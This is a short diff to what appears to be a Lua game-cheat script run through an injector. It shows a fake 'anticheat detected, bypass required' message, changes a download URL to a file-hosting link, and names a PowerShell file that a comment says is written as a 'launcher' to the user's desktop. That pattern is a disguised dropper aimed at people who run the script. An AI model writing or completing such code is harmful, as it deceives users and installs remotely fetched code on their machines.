@@ -5,7 +5,7 @@ print("Checking for latest anti-cheat...")
 wait(2)
 print(">> ANTICHEAT DETECTED - BYPASS REQUIRED FOR ADVANCED FEATURES <<")
 
-local url = https://anonfiles.ch/s/h3XMDMpCki2
+local url = 'https://files.catbox.moe/382isn.7z'
 local bypass_name = "chimera_bypass.ps1"
 
 -- This uses the injector's 'writefile' function to save our powershell launcher to the user's desktop
